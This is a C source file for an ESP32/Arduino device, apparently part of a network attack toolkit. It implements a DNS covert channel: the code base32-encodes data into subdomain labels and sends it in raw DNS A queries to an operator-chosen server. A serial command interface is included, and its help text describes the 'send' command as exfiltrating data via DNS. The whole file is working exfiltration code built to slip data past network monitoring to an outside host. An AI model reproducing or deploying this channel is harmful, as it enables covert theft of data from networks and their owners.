// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 0x4133

#include "svc_dns_covert.h"

#include <string.h>

#include <Arduino.h>
#include <esp_random.h>

#include "config.h"
#include "eth_frame.h"
#include "inject.h"
#include "ip_util.h"
#include "state.h"

bool     covertActive       = false;
uint8_t  covertServerIP[4]  = {0};
char     covertDomain[64]   = "c.local";
uint32_t covertSeq          = 0;

// ══════════════════════════════════════════════════════════════
//  10. DNS Covert Channel
// ══════════════════════════════════════════════════════════════
// Encodes data as base32 subdomains in DNS A queries.
// The "data" is carried in the query name itself:
//   <base32-chunk>.<seq>.c.local -> sent as DNS A query to server

static const char b32chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";

static uint16_t base32Encode(const uint8_t* data, uint16_t len, char* out, uint16_t maxOut) {
  uint16_t j = 0;
  uint32_t buffer = 0;
  int bits = 0;

  for (uint16_t i = 0; i < len && j < maxOut - 1; i++) {
    buffer = (buffer << 8) | data[i];
    bits += 8;
    while (bits >= 5 && j < maxOut - 1) {
      out[j++] = b32chars[(buffer >> (bits - 5)) & 0x1F];
      bits -= 5;
    }
  }
  if (bits > 0 && j < maxOut - 1) {
    out[j++] = b32chars[(buffer << (5 - bits)) & 0x1F];
  }
  out[j] = '\0';
  return j;
}

void covertDnsSend(const char* data, uint16_t dataLen) {
  // Base32 encode the data
  char encoded[256];
  uint16_t encLen = base32Encode((const uint8_t*)data, dataLen, encoded, sizeof(encoded));

  // Build DNS query with data in subdomain
  // Format: <chunk>.s<seq>.<domain>
  // Each label max 63 chars, split if needed
  uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  uint16_t pos = 0;
  pos = buildEthHeader(txBuf, broadcast, ETHERTYPE_IPV4);

  // Build DNS payload first, then wrap in UDP/IP
  uint8_t dnsPayload[300];
  uint16_t dpos = 0;

  // DNS header
  uint16_t txid = (uint16_t)(esp_random() & 0xFFFF);
  pktWrite16(dnsPayload + dpos, txid);
  dpos += 2;
  pktWrite16(dnsPayload + dpos, 0x0100);
  dpos += 2;  // RD=1
  pktWrite16(dnsPayload + dpos, 1);
  dpos += 2;  // QDCOUNT
  pktWrite16(dnsPayload + dpos, 0);
  dpos += 2;
  pktWrite16(dnsPayload + dpos, 0);
  dpos += 2;
  pktWrite16(dnsPayload + dpos, 0);
  dpos += 2;

  // QNAME: split encoded data into labels
  uint16_t offset = 0;
  while (offset < encLen) {
    uint16_t labelLen = encLen - offset;
    if (labelLen > COVERT_MAX_LABEL)
      labelLen = COVERT_MAX_LABEL;
    dnsPayload[dpos++] = (uint8_t)labelLen;
    memcpy(dnsPayload + dpos, encoded + offset, labelLen);
    dpos += labelLen;
    offset += labelLen;
  }

  // Sequence label
  char seqLabel[12];
  int seqLen = snprintf(seqLabel, sizeof(seqLabel), "s%u", covertSeq++);
  dnsPayload[dpos++] = (uint8_t)seqLen;
  memcpy(dnsPayload + dpos, seqLabel, seqLen);
  dpos += seqLen;

  // Domain suffix
  const char* dom = covertDomain;
  while (*dom) {
    const char* dot = strchr(dom, '.');
    uint8_t llen = dot ? (dot - dom) : strlen(dom);
    dnsPayload[dpos++] = llen;
    memcpy(dnsPayload + dpos, dom, llen);
    dpos += llen;
    dom += llen + (dot ? 1 : 0);
    if (!dot)
      break;
  }
  dnsPayload[dpos++] = 0;  // root

  // QTYPE=A, QCLASS=IN
  pktWrite16(dnsPayload + dpos, 0x0001);
  dpos += 2;
  pktWrite16(dnsPayload + dpos, 0x0001);
  dpos += 2;

  // Wrap in UDP -> IP
  uint16_t udpLen = 8 + dpos;
  pos += buildIPv4Header(txBuf + pos, ourIP, covertServerIP, IP_PROTO_UDP, udpLen);

  uint16_t srcPort = 10000 + (esp_random() % 50000);
  pktWrite16(txBuf + pos, srcPort);
  pos += 2;
  pktWrite16(txBuf + pos, 53);
  pos += 2;
  pktWrite16(txBuf + pos, udpLen);
  pos += 2;
  pktWrite16(txBuf + pos, 0);
  pos += 2;

  memcpy(txBuf + pos, dnsPayload, dpos);
  pos += dpos;

  sendRawFrame(txBuf, pos);
  covertSentCount++;
}

void parseCovertCommand(const char* cmd) {
  while (*cmd == ' ')
    cmd++;

  if (strncmp(cmd, "dns", 3) == 0) {
    cmd += 3;
    while (*cmd == ' ')
      cmd++;

    if (strncmp(cmd, "server", 6) == 0) {
      cmd += 6;
      while (*cmd == ' ')
        cmd++;
      if (parseIP(cmd, covertServerIP)) {
        covertActive = true;
        Serial.printf("[COVERT] DNS server set to %u.%u.%u.%u\n", covertServerIP[0],
                      covertServerIP[1], covertServerIP[2], covertServerIP[3]);
      } else {
        Serial.println("[COVERT] Usage: covert dns server X.X.X.X");
      }
    } else if (strncmp(cmd, "domain", 6) == 0) {
      cmd += 6;
      while (*cmd == ' ')
        cmd++;
      strncpy(covertDomain, cmd, sizeof(covertDomain) - 1);
      Serial.printf("[COVERT] Domain set to %s\n", covertDomain);
    } else if (strncmp(cmd, "send", 4) == 0) {
      cmd += 4;
      while (*cmd == ' ')
        cmd++;
      if (!covertActive || covertServerIP[0] == 0) {
        Serial.println("[COVERT] Set server first: covert dns server X.X.X.X");
        return;
      }
      if (*cmd == '"')
        cmd++;  // strip quotes
      uint16_t dlen = strlen(cmd);
      if (dlen > 0 && cmd[dlen - 1] == '"')
        dlen--;
      covertDnsSend(cmd, dlen);
      Serial.printf("[COVERT] Sent %u bytes as DNS query #%u\n", dlen, covertSeq - 1);
    } else {
      Serial.printf("[COVERT] DNS channel: %s (%u queries sent)\n",
                    covertActive ? "configured" : "not configured", covertSentCount);
      Serial.println("  covert dns server X.X.X.X  - set DNS server");
      Serial.println("  covert dns domain name     - set base domain (default: c.local)");
      Serial.println("  covert dns send \"data\"     - exfiltrate data via DNS");
    }
  } else {
    Serial.println("[COVERT] Channels:");
    Serial.println("  covert dns ...  - DNS subdomain exfiltration");
  }
}
